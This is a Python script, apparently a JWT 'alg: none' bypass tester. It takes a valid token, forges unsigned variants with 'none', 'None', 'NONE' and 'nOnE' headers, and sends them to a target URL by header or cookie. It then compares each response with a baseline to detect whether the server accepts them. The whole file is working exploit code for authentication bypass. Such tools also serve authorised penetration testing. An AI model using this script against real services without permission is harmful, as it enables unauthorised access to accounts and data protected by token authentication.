import base64
import json
import requests


def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def generate_alg_none_tokens(token):

    parts = token.split(".")

    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    payload = parts[1]

    algorithms = [
        "none",
        "None",
        "NONE",
        "nOnE"
    ]

    tokens = []

    for algorithm in algorithms:

        header = {
            "alg": algorithm,
            "typ": "JWT"
        }

        encoded_header = base64url_encode(
            json.dumps(
                header,
                separators=(",", ":")
            ).encode()
        )

        alg_none_token = encoded_header + "." + payload + "."

        tokens.append((algorithm, alg_none_token))

    return tokens



def send_token(url, token, location="header", cookie_name=None):

    headers = {}
    cookies = {}

    if location == "header":

        headers["Authorization"] = f"Bearer {token}"

    elif location == "cookie":

        if not cookie_name:
            raise ValueError("Cookie name is required")

        cookies[cookie_name] = token

    else:

        raise ValueError("Invalid JWT location")

    response = requests.get(
        url,
        headers=headers,
        cookies=cookies,
        timeout=10,
        allow_redirects=False
    )

    return response

# it check the response baseline.
def get_baseline_response(
    url,
    original_token,
    location="header",
    cookie_name=None
):

    response = send_token(
        url,
        original_token,
        location,
        cookie_name
    )

    return response

# it check the valid url
def validate_baseline(response):

    if response.status_code < 200 or response.status_code >= 300:
        print("\n[-] Baseline request failed.")
        print(f"[-] Status Code: {response.status_code}")
        print("[-] Please verify the target URL and JWT.")

        return False

    return True


# respone alanyze
def analyze_response(baseline_response, test_response):

    baseline_status = baseline_response.status_code
    baseline_size = len(baseline_response.content)

    test_status = test_response.status_code
    test_size = len(test_response.content)

    if (
        baseline_status == test_status
        and baseline_size == test_size
    ):
        return True

    return False